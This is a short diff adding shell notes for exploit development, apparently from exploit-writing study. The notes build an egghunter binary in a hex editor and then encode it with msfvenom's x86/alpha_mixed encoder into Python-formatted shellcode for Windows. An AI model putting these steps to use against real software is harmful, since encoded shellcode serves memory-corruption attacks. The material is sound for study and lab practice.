@@ -1,0 +1,5 @@
+touch egghunt.bin
+#Remove " and \x then concatenate in egghunt.bin
+hexeditor -b egghunt.bin
+#CTRl+A add, CTRL+D remove bytes
+cat egghunt.bin|msfvenom -e x86/alpha_mixed --arch x86 --platform windows -f python -o egghunter_encoded.txt
